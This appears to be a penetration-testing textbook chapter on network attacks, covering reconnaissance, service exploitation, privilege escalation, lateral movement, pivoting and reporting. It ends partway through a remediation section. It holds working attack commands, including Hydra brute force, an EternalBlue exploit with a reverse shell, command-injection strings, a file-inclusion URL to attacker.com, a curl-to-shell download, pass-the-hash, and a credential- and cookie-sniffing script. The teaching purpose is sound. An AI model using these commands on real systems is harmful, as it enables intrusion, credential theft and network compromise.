# Network Penetration Testing

In this chapter, we'll explore the techniques and methodologies used in network penetration testing. Network penetration testing involves identifying and exploiting vulnerabilities in network infrastructure, including routers, firewalls, switches, and network services, to assess an organization's security posture.

## Learning Objectives

By the end of this chapter, you will be able to:

1. Understand the methodology for network penetration testing
2. Perform comprehensive network reconnaissance and enumeration
3. Identify common network vulnerabilities and misconfigurations
4. Execute network-based attacks using industry-standard tools
5. Exploit vulnerable network services and gain initial access
6. Implement post-exploitation techniques for network penetration
7. Document network vulnerabilities and provide remediation recommendations

## 1. Network Penetration Testing Methodology

### 1.1 Planning and Preparation

Before beginning a network penetration test, proper planning is essential:

1. **Defining Scope**:
   - Target IP ranges and network segments
   - In-scope network devices and services
   - Testing timeframes and blackout periods
   - Excluded systems and networks
   - Testing limitations and constraints

2. **Information Gathering**:
   - Network architecture documentation
   - Network diagrams and maps
   - IP addressing schemes
   - Network segmentation details
   - Security controls information

3. **Risk Assessment**:
   - Identifying critical systems
   - Understanding potential impact
   - Establishing emergency procedures
   - Creating rollback plans
   - Setting up communication channels

```
# Network Penetration Testing Methodology (ASCII Diagram)

+------------------------+     +------------------------+     +------------------------+
|                        |     |                        |     |                        |
|  Planning/Preparation  | --> |  Network Discovery     | --> |  Vulnerability         |
|                        |     |  & Enumeration         |     |  Assessment            |
|                        |     |                        |     |                        |
+------------------------+     +------------------------+     +------------------------+
                                                                          |
                                                                          v
+------------------------+     +------------------------+     +------------------------+
|                        |     |                        |     |                        |
|  Reporting &           | <-- |  Post-Exploitation     | <-- |  Exploitation          |
|  Remediation           |     |  & Pivoting            |     |                        |
|                        |     |                        |     |                        |
+------------------------+     +------------------------+     +------------------------+
```

### 1.2 Network Penetration Testing Approaches

Different approaches can be used based on the testing objectives:

1. **External Network Testing**:
   - Simulates attacks from the internet
   - Focuses on perimeter security
   - Tests public-facing assets
   - Evaluates firewall and IDS/IPS effectiveness
   - Identifies exposed services and vulnerabilities

2. **Internal Network Testing**:
   - Simulates insider threats or breached perimeter
   - Assesses internal network segmentation
   - Tests lateral movement capabilities
   - Evaluates internal access controls
   - Identifies privilege escalation paths

3. **Segmentation Testing**:
   - Verifies network segmentation effectiveness
   - Tests traffic filtering between segments
   - Assesses VLAN security
   - Evaluates firewall rule effectiveness
   - Identifies segmentation bypass methods

> **Knowledge Check:** What are the key differences between external and internal network penetration testing? Why might an organization want to conduct both types of tests?

## 2. Network Reconnaissance and Discovery

### 2.1 Passive Network Reconnaissance

Passive reconnaissance gathers information without directly interacting with target systems:

1. **OSINT for Networks**:
   - DNS records and domain information
   - IP address blocks and ASN information
   - Network service fingerprinting from public sources
   - Historical network data
   - Organization's technical footprint

2. **Tools for Passive Reconnaissance**:
   - Shodan
   - Censys
   - SecurityTrails
   - DNSDumpster
   - BGP Toolkit

```bash
# Example: Passive network reconnaissance

# Step 1: Gather domain information
whois example.com | grep -E "IP Address|Server|Network"

# Step 2: Check DNS records
dig +short example.com
dig +short -t MX example.com
dig +short -t NS example.com
dig +short -t TXT example.com

# Step 3: Find IP ranges owned by organization
whois -h whois.radb.net -- '-i origin AS15169' | grep -Eo "([0-9.]+){4}/[0-9]+"

# Step 4: Check historical DNS data
curl -s "https://securitytrails.com/domain/example.com/history/a"

# Step 5: Search for exposed services using Shodan API
shodan search "org:\"Example Organization\" country:US"
```

### 2.2 Active Network Discovery

Active discovery involves direct interaction with target networks:

1. **Network Scanning Techniques**:
   - Host discovery (ping sweeps)
   - Port scanning
   - Service detection
   - OS fingerprinting
   - Network topology mapping

2. **Host Discovery Methods**:
   - ICMP echo scanning
   - ARP scanning (local networks)
   - TCP SYN/ACK scanning
   - UDP scanning
   - SCTP INIT scanning

3. **Port Scanning Strategies**:
   - TCP connect scan
   - SYN scan (half-open)
   - FIN, XMAS, NULL scans
   - UDP scan
   - Version detection scan

```bash
# Example: Active network discovery with Nmap

# Step 1: Host discovery (ping sweep)
sudo nmap -sn 192.168.1.0/24 -oN hosts.txt

# Step 2: Quick port scan of discovered hosts
sudo nmap -sS -F -iL hosts.txt -oN quick_ports.txt

# Step 3: Full TCP port scan of interesting hosts
sudo nmap -sS -p- 192.168.1.100,101,102 -oN full_tcp_ports.txt

# Step 4: Service version detection
sudo nmap -sV -p 21,22,80,443,3389 192.168.1.100 -oN service_versions.txt

# Step 5: OS detection
sudo nmap -O 192.168.1.100 -oN os_detection.txt

# Step 6: Comprehensive scan with scripts
sudo nmap -sS -sV -O -A --script default,safe 192.168.1.100 -oA comprehensive_scan
```

### 2.3 Network Service Enumeration

Detailed enumeration of discovered network services:

1. **Common Network Services to Enumerate**:
   - DNS (53/TCP, 53/UDP)
   - FTP (21/TCP)
   - SSH (22/TCP)
   - Telnet (23/TCP)
   - SMTP (25/TCP)
   - HTTP/HTTPS (80/TCP, 443/TCP)
   - SMB/CIFS (139/TCP, 445/TCP)
   - SNMP (161/UDP)
   - LDAP (389/TCP)
   - RDP (3389/TCP)

2. **Service-Specific Enumeration Techniques**:
   - Banner grabbing
   - Version detection
   - Default credential testing
   - Configuration analysis
   - Service-specific vulnerabilities

```bash
# Example: Service-specific enumeration

# Step 1: DNS enumeration
host -t axfr example.com ns1.example.com
dnsrecon -d example.com -t axfr
fierce -domain example.com

# Step 2: FTP enumeration
nmap --script ftp-* -p 21 192.168.1.100
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# Step 3: SSH enumeration
nmap --script ssh-* -p 22 192.168.1.100
ssh-audit 192.168.1.100

# Step 4: HTTP/HTTPS enumeration
nikto -h http://192.168.1.100
whatweb http://192.168.1.100
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# Step 5: SMB enumeration
enum4linux -a 192.168.1.100
smbmap -H 192.168.1.100
nmap --script smb-* -p 139,445 192.168.1.100

# Step 6: SNMP enumeration
snmpwalk -v 2c -c public 192.168.1.100
onesixtyone -c community.txt 192.168.1.100
```

> **Hands-on Exercise:** Set up a lab environment with multiple virtual machines running different network services. Use Nmap to perform a comprehensive network scan, identifying all hosts and open ports. Then, perform detailed enumeration of at least three different services (e.g., HTTP, SMB, and SNMP). Document your findings, including service versions, potential vulnerabilities, and misconfigurations.

## 3. Network Vulnerability Assessment

### 3.1 Automated Vulnerability Scanning

Using automated tools to identify network vulnerabilities:

1. **Vulnerability Scanner Types**:
   - Network vulnerability scanners
   - Web application scanners
   - Database scanners
   - Compliance scanners
   - Wireless network scanners

2. **Popular Vulnerability Scanners**:
   - Nessus
   - OpenVAS
   - Nexpose
   - Qualys
   - Acunetix

3. **Scanning Best Practices**:
   - Proper scope configuration
   - Scan scheduling and timing
   - Credential vs. non-credential scanning
   - Safe scanning options
   - Scan validation and verification

```bash
# Example: Setting up and running OpenVAS

# Step 1: Install OpenVAS
sudo apt update
sudo apt install openvas -y

# Step 2: Set up OpenVAS
sudo gvm-setup

# Step 3: Create a user
sudo gvmd --create-user=admin --password=secure_password

# Step 4: Start the services
sudo gvm-start

# Step 5: Access the web interface
# Navigate to https://localhost:9392

# Step 6: Create a new target
# Via web interface: Configuration > Targets > New Target
# Name: Internal Network
# Hosts: 192.168.1.0/24
# Credentials: Add SSH and SMB credentials if available

# Step 7: Create a new task
# Via web interface: Scans > Tasks > New Task
# Name: Internal Network Scan
# Scan Config: Full and Fast
# Target: Internal Network

# Step 8: Start the scan and analyze results
# Via web interface: Click on the play button next to the task
```

### 3.2 Manual Vulnerability Assessment

Complementing automated scans with manual assessment:

1. **Service Configuration Review**:
   - Default installations and configurations
   - Unnecessary services and features
   - Insecure protocol usage
   - Weak encryption settings
   - Outdated software versions

2. **Common Network Vulnerabilities**:
   - Unpatched systems and services
   - Default or weak credentials
   - Insecure protocols (Telnet, FTP, HTTP)
   - Missing encryption
   - Excessive service permissions

3. **Network Security Control Assessment**:
   - Firewall rule effectiveness
   - IDS/IPS evasion testing
   - Network segmentation validation
   - Access control verification
   - Traffic filtering assessment

```bash
# Example: Manual vulnerability assessment techniques

# Step 1: Check for outdated SSH configuration
ssh -v 192.168.1.100 2>&1 | grep "Protocol"
# Look for Protocol 1 (insecure) or old ciphers

# Step 2: Test SSL/TLS configuration
sslscan 192.168.1.100:443
testssl.sh 192.168.1.100:443

# Step 3: Check for anonymous FTP access
ftp 192.168.1.100
# Try logging in with "anonymous" and any email as password

# Step 4: Verify SNMP security
snmpwalk -v 1 -c public 192.168.1.100
snmpwalk -v 1 -c private 192.168.1.100
# Success indicates default community strings in use

# Step 5: Test for SMB vulnerabilities
nmap --script smb-vuln* -p 445 192.168.1.100

# Step 6: Check for open mail relays
nmap --script smtp-open-relay -p 25 192.168.1.100
```

### 3.3 Vulnerability Validation and Prioritization

Confirming and prioritizing discovered vulnerabilities:

1. **Vulnerability Validation Techniques**:
   - Manual verification
   - Proof-of-concept testing
   - Exploitation attempts
   - False positive elimination
   - Context-based validation

2. **Vulnerability Scoring**:
   - CVSS (Common Vulnerability Scoring System)
   - Exploitability factors
   - Impact assessment
   - Environmental considerations
   - Temporal factors

3. **Prioritization Factors**:
   - Business criticality of affected systems
   - Exposure level (internet-facing vs. internal)
   - Exploitation complexity
   - Available mitigations
   - Potential impact on operations

> **Knowledge Check:** Why is it important to validate and prioritize vulnerabilities discovered during automated scanning? What factors should be considered when determining the risk level of a network vulnerability?

## 4. Network-Based Attacks

### 4.1 Network Protocol Attacks

Exploiting weaknesses in network protocols:

1. **ARP Spoofing/Poisoning**:
   - Technique: Sending falsified ARP messages
   - Purpose: Man-in-the-middle attacks, session hijacking
   - Tools: Arpspoof, Ettercap, Bettercap
   - Detection: ARP inspection, static ARP entries
   - Prevention: Dynamic ARP inspection, DHCP snooping

2. **VLAN Hopping**:
   - Technique: Bypassing VLAN segmentation
   - Methods: Switch spoofing, double tagging
   - Tools: Yersinia, VLANping
   - Detection: Port security, monitoring trunk ports
   - Prevention: Disable unused ports, proper trunk configuration

3. **DNS Attacks**:
   - Techniques: Cache poisoning, DNS spoofing
   - Purpose: Traffic redirection, phishing
   - Tools: DNSspoof, Ettercap, Responder
   - Detection: DNS monitoring, DNSSEC validation
   - Prevention: DNSSEC, DNS query monitoring

```bash
# Example: ARP spoofing attack with Ettercap

# Step 1: Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Step 2: Start Ettercap GUI
sudo ettercap -G

# Step 3: Scan for hosts (Hosts > Scan for hosts)

# Step 4: Set targets
# Target 1: Default gateway (e.g., 192.168.1.1)
# Target 2: Victim host (e.g., 192.168.1.100)

# Step 5: Start ARP poisoning
# Mitm > ARP poisoning > Sniff remote connections

# Step 6: View intercepted traffic
# View > Connections

# Step 7: Capture credentials
# View intercepted passwords in the bottom pane

# Step 8: Stop the attack and restore ARP tables
# Mitm > Stop mitm attack(s)
```

### 4.2 Man-in-the-Middle Attacks

Intercepting and potentially modifying network traffic:

1. **SSL/TLS Interception**:
   - Technique: Intercepting encrypted communications
   - Tools: SSLstrip, Burp Suite, mitmproxy
   - Attack vectors: Downgrade attacks, certificate spoofing
   - Detection: Certificate validation, HSTS
   - Prevention: Certificate pinning, HSTS preloading

2. **Wi-Fi-Based MitM**:
   - Technique: Evil twin access points, deauthentication
   - Tools: Aircrack-ng suite, WiFi-Pumpkin
   - Attack vectors: Rogue access points, client deauthentication
   - Detection: Wireless IDS, rogue AP detection
   - Prevention: 802.1X, WPA3, wireless monitoring

3. **Session Hijacking**:
   - Technique: Stealing session tokens after authentication
   - Tools: Wireshark, Ettercap, Hamster/Ferret
   - Attack vectors: Sidejacking, session fixation
   - Detection: Session monitoring, anomaly detection
   - Prevention: HTTPS, secure cookies, session timeouts

```python
# Example: Simple Python script for HTTP session hijacking detection

import scapy.all as scapy
from scapy.layers import http

def sniff_packets(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
        keywords = ['username', 'user', 'login', 'password', 'pass', 'email']
        for keyword in keywords:
            if keyword in load.lower():
                return load

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet).decode('utf-8')
        print(f"[+] HTTP Request >> {url}")
        
        credentials = get_credentials(packet)
        if credentials:
            print(f"[+] Possible credentials: {credentials}")
        
        # Check for cookies (potential session tokens)
        if packet.haslayer(http.HTTPRequest):
            if 'Cookie' in packet[http.HTTPRequest].fields:
                cookie = packet[http.HTTPRequest].Cookie.decode('utf-8')
                print(f"[+] Cookie captured: {cookie}")

print("[*] Starting packet capture...")
sniff_packets("eth0")  # Replace with your interface
```

### 4.3 Network Sniffing and Traffic Analysis

Capturing and analyzing network traffic:

1. **Passive Sniffing**:
   - Technique: Capturing traffic on the same broadcast domain
   - Tools: Wireshark, tcpdump, NetworkMiner
   - Targets: Unencrypted protocols, authentication data
   - Detection: Difficult to detect
   - Prevention: Encryption, network segmentation

2. **Active Sniffing**:
   - Technique: Forcing traffic through the attacker's system
   - Methods: ARP poisoning, MAC flooding, port mirroring
   - Tools: Ettercap, Bettercap, Arpspoof
   - Detection: Network monitoring, ARP inspection
   - Prevention: Encryption, switch security features

3. **Protocol Analysis**:
   - Focus: Understanding protocol behavior and weaknesses
   - Tools: Wireshark, Protocol Analyzers
   - Targets: Protocol implementation flaws, information leakage
   - Applications: Troubleshooting, security assessment
   - Prevention: Protocol security reviews, secure implementations

```bash
# Example: Network traffic capture and analysis with tcpdump and Wireshark

# Step 1: Capture traffic with tcpdump
sudo tcpdump -i eth0 -w capture.pcap -s 0 'host 192.168.1.100'

# Step 2: Capture specific protocol traffic
sudo tcpdump -i eth0 -w http_traffic.pcap -s 0 'tcp port 80 or tcp port 443'

# Step 3: Analyze captured traffic with Wireshark
wireshark capture.pcap

# Step 4: Apply Wireshark display filters
# HTTP traffic: http
# Credentials: http.request.method == "POST"
# SMB traffic: smb || smb2
# DNS queries: dns
# Clear text passwords: http.request.method == "POST" && tcp contains "password"

# Step 5: Follow TCP streams for session analysis
# Right-click on packet > Follow > TCP Stream

# Step 6: Extract files from captured traffic
# File > Export Objects > HTTP/SMB/etc.
```

> **Hands-on Exercise:** Set up a lab environment with at least three systems: an attacker machine, a victim client, and a server. Perform an ARP spoofing attack to intercept traffic between the client and server. Capture and analyze the traffic using Wireshark, focusing on identifying sensitive information such as credentials, session tokens, and unencrypted data. Document your findings and explain how encryption would mitigate this attack.

## 5. Exploiting Network Services

### 5.1 Remote Access Service Exploitation

Attacking services that provide remote access to systems:

1. **SSH Exploitation**:
   - Attack vectors: Weak credentials, key-based authentication flaws
   - Vulnerabilities: Outdated versions, misconfiguration
   - Tools: Hydra, Metasploit, custom scripts
   - Techniques: Brute force, known vulnerabilities
   - Prevention: Key-based auth, fail2ban, version management

2. **RDP Exploitation**:
   - Attack vectors: Weak credentials, unpatched vulnerabilities
   - Vulnerabilities: BlueKeep (CVE-2019-0708), misconfiguration
   - Tools: Hydra, RDPcrack, Metasploit
   - Techniques: Brute force, exploitation of known CVEs
   - Prevention: NLA, patching, restricted access

3. **VPN Service Exploitation**:
   - Attack vectors: Pre-auth vulnerabilities, weak credentials
   - Vulnerabilities: Implementation flaws, outdated software
   - Tools: Exploit-specific tools, custom scripts
   - Techniques: Exploitation of known CVEs, credential attacks
   - Prevention: Patching, MFA, restricted access

```bash
# Example: SSH brute force attack with Hydra

# Step 1: Create username and password lists
echo "root
admin
user
administrator" > users.txt

echo "password
123456
admin
qwerty
welcome" > passwords.txt

# Step 2: Run Hydra against SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4

# Step 3: Run Hydra with additional options
hydra -L users.txt -P passwords.txt -e nsr ssh://192.168.1.100 -t 4
# -e nsr: n = null password, s = same as username, r = reversed username

# Step 4: Target specific username
hydra -l admin -P passwords.txt ssh://192.168.1.100 -t 4

# Step 5: Use Metasploit for SSH scanning
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
set VERBOSE true
run
```

### 5.2 File Sharing Service Exploitation

Attacking network file sharing services:

1. **SMB/CIFS Exploitation**:
   - Attack vectors: Weak authentication, unpatched vulnerabilities
   - Vulnerabilities: EternalBlue, SMBGhost, misconfiguration
   - Tools: Metasploit, CrackMapExec, SMBMap
   - Techniques: Exploitation of known CVEs, null sessions, relay attacks
   - Prevention: Patching, proper configuration, network segmentation

2. **NFS Exploitation**:
   - Attack vectors: Misconfiguration, weak access controls
   - Vulnerabilities: No_root_squash, world-readable exports
   - Tools: Showmount, nfsshell, custom scripts
   - Techniques: Mount enumeration, unauthorized access
   - Prevention: Proper export configuration, access restrictions

3. **FTP Exploitation**:
   - Attack vectors: Anonymous access, clear-text credentials
   - Vulnerabilities: Outdated versions, misconfiguration
   - Tools: Hydra, Metasploit, custom scripts
   - Techniques: Brute force, anonymous access abuse
   - Prevention: SFTP, access restrictions, strong authentication

```bash
# Example: SMB exploitation techniques

# Step 1: Enumerate SMB shares
smbclient -L //192.168.1.100 -N
smbmap -H 192.168.1.100

# Step 2: Check for null sessions
smbclient //192.168.1.100/IPC$ -N

# Step 3: Access shares with discovered credentials
smbclient //192.168.1.100/Data -U 'domain\user%password'

# Step 4: Use CrackMapExec for SMB exploitation
crackmapexec smb 192.168.1.0/24 -u administrator -p 'password' --shares

# Step 5: Check for EternalBlue vulnerability
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100

# Step 6: Exploit EternalBlue with Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### 5.3 Web Service Exploitation

Attacking web servers and applications:

1. **Web Server Vulnerabilities**:
   - Attack vectors: Misconfiguration, outdated software
   - Vulnerabilities: Directory traversal, information disclosure
   - Tools: Nikto, Dirb, Metasploit
   - Techniques: Path manipulation, known CVE exploitation
   - Prevention: Patching, proper configuration, web application firewall

2. **Web Application Attacks**:
   - Attack vectors: Input validation flaws, authentication weaknesses
   - Vulnerabilities: OWASP Top 10 (injection, XSS, CSRF, etc.)
   - Tools: Burp Suite, OWASP ZAP, SQLmap
   - Techniques: Injection attacks, authentication bypass
   - Prevention: Secure coding, input validation, output encoding

3. **API Exploitation**:
   - Attack vectors: Weak authentication, excessive permissions
   - Vulnerabilities: OWASP API Top 10
   - Tools: Postman, custom scripts, API-focused scanners
   - Techniques: Parameter tampering, rate limiting bypass
   - Prevention: API gateway, proper authentication, rate limiting

```bash
# Example: Basic web server and application exploitation

# Step 1: Scan web server for vulnerabilities
nikto -h http://192.168.1.100

# Step 2: Directory and file enumeration
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# Step 3: Check for SQL injection
sqlmap -u "http://192.168.1.100/page.php?id=1" --dbs

# Step 4: Test for command injection
# Try entering in web forms or URL parameters:
# ; ls -la
# & whoami
# | cat /etc/passwd

# Step 5: Check for file inclusion vulnerabilities
# Try accessing:
# http://192.168.1.100/page.php?file=../../../etc/passwd
# http://192.168.1.100/page.php?file=http://attacker.com/malicious.txt

# Step 6: Use Metasploit for web server exploitation
msfconsole -q
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
run

use exploit/multi/http/apache_mod_cgi_bash_env_exec  # Shellshock
set RHOSTS 192.168.1.100
set TARGETURI /cgi-bin/vulnerable.cgi
exploit
```

### 5.4 Database Service Exploitation

Attacking database servers:

1. **SQL Server Exploitation**:
   - Attack vectors: Weak credentials, excessive privileges
   - Vulnerabilities: Misconfiguration, unpatched instances
   - Tools: SQLmap, Metasploit, custom scripts
   - Techniques: Brute force, known exploits, privilege escalation
   - Prevention: Patching, strong authentication, network segmentation

2. **MySQL/MariaDB Exploitation**:
   - Attack vectors: Weak credentials, configuration issues
   - Vulnerabilities: User privilege issues, outdated versions
   - Tools: Metasploit, custom scripts, SQLmap
   - Techniques: Brute force, UDF exploitation
   - Prevention: Strong authentication, minimal privileges, patching

3. **NoSQL Database Exploitation**:
   - Attack vectors: Injection flaws, weak authentication
   - Vulnerabilities: NoSQL injection, excessive permissions
   - Tools: NoSQLMap, custom scripts
   - Techniques: Injection attacks, authentication bypass
   - Prevention: Input validation, strong authentication, access controls

```bash
# Example: Database service exploitation

# Step 1: Scan for database services
nmap -sV -p 1433,3306,5432,27017 192.168.1.0/24

# Step 2: MySQL brute force
hydra -l root -P passwords.txt mysql://192.168.1.100

# Step 3: MySQL exploitation with Metasploit
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Step 4: Access MySQL with discovered credentials
mysql -h 192.168.1.100 -u root -p

# Step 5: SQL Server exploitation
msfconsole -q
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Step 6: MongoDB enumeration
mongo --host 192.168.1.100 --port 27017
# In MongoDB shell:
show dbs
use admin
show collections
db.system.users.find()
```

> **Knowledge Check:** What are the most common vulnerabilities found in network services? How do exploitation techniques differ between file sharing services, web services, and database services?

## 6. Post-Exploitation and Pivoting

### 6.1 Privilege Escalation

Elevating privileges after initial access:

1. **Local Privilege Escalation**:
   - Techniques: Kernel exploits, misconfigured permissions
   - Tools: LinPEAS/WinPEAS, linux-exploit-suggester
   - Common vectors: SUID binaries, cron jobs, service misconfigurations
   - Detection: Behavior monitoring, integrity checking
   - Prevention: Patching, principle of least privilege

2. **Network Service Privilege Escalation**:
   - Techniques: Service-specific vulnerabilities, credential reuse
   - Tools: Metasploit, custom exploits
   - Common vectors: Vulnerable services running as privileged users
   - Detection: Service monitoring, privilege auditing
   - Prevention: Service hardening, minimal privileges

3. **Credential Harvesting**:
   - Techniques: Memory dumping, keylogging, token theft
   - Tools: Mimikatz, LaZagne, Responder
   - Common vectors: Cached credentials, clear-text storage
   - Detection: Memory scanning, credential access monitoring
   - Prevention: Credential protection, MFA, privileged access management

```bash
# Example: Linux privilege escalation techniques

# Step 1: Gather system information
uname -a
cat /etc/issue
cat /proc/version

# Step 2: Check for kernel exploits
searchsploit "Linux Kernel $(uname -r)"

# Step 3: Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Step 4: Check for writable service files
find /etc/init.d/ -writable -type f 2>/dev/null
find /etc/systemd/system/ -writable -type f 2>/dev/null

# Step 5: Look for cron jobs
ls -la /etc/cron*
cat /etc/crontab

# Step 6: Check for misconfigured sudo permissions
sudo -l

# Step 7: Use automated tools
# Run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Step 8: Exploit a vulnerable SUID binary (example)
# If find has SUID bit:
find / -exec /bin/sh -p \; -quit
```

### 6.2 Lateral Movement

Moving between systems in the network:

1. **Pass-the-Hash Attacks**:
   - Technique: Using password hashes without knowing plaintext
   - Tools: Mimikatz, CrackMapExec, Impacket
   - Targets: Windows domains, NTLM authentication
   - Detection: Authentication monitoring, credential theft detection
   - Prevention: Credential Guard, LAPS, network segmentation

2. **Remote Command Execution**:
   - Techniques: WMI, PowerShell Remoting, PsExec
   - Tools: Impacket, CrackMapExec, PowerShell Empire
   - Targets: Windows systems with administrative access
   - Detection: Process monitoring, command-line logging
   - Prevention: AppLocker, constrained language mode, JEA

3. **Internal Service Exploitation**:
   - Techniques: Exploiting vulnerable internal services
   - Tools: Metasploit, custom exploits
   - Targets: Unpatched internal systems, legacy applications
   - Detection: Vulnerability management, network monitoring
   - Prevention: Patching, network segmentation, zero trust

```bash
# Example: Lateral movement techniques

# Step 1: Pass-the-Hash with Impacket
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.100

# Step 2: SMB execution with CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -p 'password' -x 'whoami'

# Step 3: PowerShell Remoting
crackmapexec winrm 192.168.1.100 -u administrator -p 'password' -X '$PSVersionTable'

# Step 4: Use Metasploit for lateral movement
# From a Meterpreter session:
meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > run post/windows/manage/autoroute
meterpreter > background

# Use gathered credentials for lateral movement
use exploit/windows/smb/psexec
set SMBDomain WORKGROUP
set SMBUser administrator
set SMBPass password
set RHOSTS 192.168.1.101
exploit
```

### 6.3 Network Pivoting

Using compromised systems to access otherwise unreachable networks:

1. **Port Forwarding**:
   - Technique: Redirecting traffic through compromised hosts
   - Tools: SSH, Socat, Chisel
   - Purpose: Accessing services on internal networks
   - Detection: Unusual network connections, traffic analysis
   - Prevention: Network segmentation, egress filtering

2. **Proxy Tunneling**:
   - Technique: Creating proxy connections through compromised hosts
   - Tools: Proxychains, SOCKS proxies, Meterpreter
   - Purpose: Routing attack traffic through compromised systems
   - Detection: Unusual outbound connections, protocol analysis
   - Prevention: Egress filtering, application whitelisting

3. **VPN Pivoting**:
   - Technique: Creating VPN connections through compromised hosts
   - Tools: Sshuttle, OpenVPN, Meterpreter
   - Purpose: Full network access through compromised systems
   - Detection: Unusual encrypted traffic, network monitoring
   - Prevention: Network segmentation, traffic analysis

```bash
# Example: Network pivoting techniques

# Step 1: SSH port forwarding
# Local port forwarding (access remote service locally)
ssh -L 8080:internal-server:80 user@compromised-host

# Remote port forwarding (expose local service to remote host)
ssh -R 8080:localhost:80 user@compromised-host

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 user@compromised-host

# Step 2: Use proxychains with SSH dynamic forwarding
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
proxychains nmap -sT -P0 192.168.2.0/24

# Step 3: Metasploit pivoting
# From a Meterpreter session:
meterpreter > run autoroute -s 192.168.2.0/24
meterpreter > background

# Set up a SOCKS proxy
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 9050
run

# Use proxychains with Metasploit SOCKS proxy
proxychains nmap -sT -P0 192.168.2.100

# Step 4: Chisel pivoting
# On attacker machine:
./chisel server -p 8080 --reverse

# On compromised host:
./chisel client 192.168.1.50:8080 R:socks
```

> **Hands-on Exercise:** Set up a multi-segment network lab with at least three network segments. Gain access to a system in the first segment, then use pivoting techniques to access systems in the second and third segments that are not directly reachable from your attack machine. Document the techniques used, including port forwarding, proxy tunneling, and routing. Explain how network segmentation could be improved to prevent such pivoting.

## 7. Network Penetration Testing Documentation

### 7.1 Documenting Findings

Properly documenting discovered vulnerabilities:

1. **Vulnerability Documentation Components**:
   - Vulnerability description and classification
   - Affected systems and services
   - Technical details and proof of concept
   - Exploitation method and impact
   - Evidence (screenshots, logs, output)

2. **Documentation Best Practices**:
   - Clear, concise descriptions
   - Reproducible steps
   - Evidence-based findings
   - Severity and risk ratings
   - Affected asset inventory

3. **Documentation Tools**:
   - Penetration testing frameworks (Metasploit, Faraday)
   - Note-taking applications (CherryTree, OneNote)
   - Screenshot and screen recording tools
   - Vulnerability management platforms
   - Custom reporting templates

```markdown
# Example: Vulnerability documentation template

## Vulnerability: SMB EternalBlue (MS17-010)

### Description
The target system is vulnerable to MS17-010 (EternalBlue), which allows remote code execution via specially crafted packets to the SMB service.

### Affected Systems
- 192.168.1.100 (FILESERVER01)
- 192.168.1.101 (FILESERVER02)

### Technical Details
The systems are running Windows Server 2008 R2 with SMB version 1 enabled and missing the security patch for MS17-010.

### Evidence
```bash
# Nmap scan showing vulnerability
$ nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-15 14:30 EDT
Nmap scan report for 192.168.1.100
Host is up (0.0050s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Description:
|       The SMBv1 server in various Microsoft products contains a vulnerability that could allow
|       remote attackers to execute arbitrary code on the target system.
|_      References: https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

### Exploitation Method
The vulnerability was exploited using Metasploit's `exploit/windows/smb/ms17_010_eternalblue` module, resulting in SYSTEM level access to the affected systems.

### Impact
This vulnerability allows an attacker to gain complete control of the affected systems with SYSTEM privileges, potentially leading to full domain compromise.

### Remediation
1. Apply Microsoft security patch for MS17-010
2. Disable SMBv1 on all Windows systems
3. Implement network segmentation to restrict SMB traffic
4. Monitor for exploitation attempts

### CVSS Score
CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (Base Score: 9.8)
```

### 7.2 Remediation Recommendations

Providing actionable security recommendations:

1. **Effective Remediation Advice**:
   - Clear, specific instructions
   - Prioritized recommendations
   - Multiple mitigation options
   - Verification methods
   - Implementation considerations

2. **Types of Remediation**:
   - Patching and updates
   - Configuration changes
   - Architectural improvements
   - Procedural controls
   - Compensating controls

3. **Remediation Prioritization**:
   - Risk-based approach
   - Quick wins vs. long-term solutions
   - Operational impact considerations
   - Resource requirements
   - Implementation complexity

```markdown
# Example: Remediation recommendations for common network vulnerabilities

## 1. Outdated and Vulnerable Services

### Finding
Multiple systems are running outdated versions of SSH (OpenSSH 5.9p1) with known vulnerabilities.

### Remediation Steps
1. **High Priority**: Update OpenSSH to the latest stable version (currently 9.1p1)
   ```bash
   sudo apt update
   sudo apt install openssh-server
   ```

2. **Alternative**: If updating is not immediately possible, implement the following mitigations:
   - Restrict SSH access to specific IP addresses in firewall rules
   - Implement fail2ban to prevent brute force attacks
   - Disable password authentication and use key-based authentication only

3. **Verification**: Confirm the update with:
   ```bash
   ssh -V
   ```

## 2. Weak Network Segmentation

### Finding
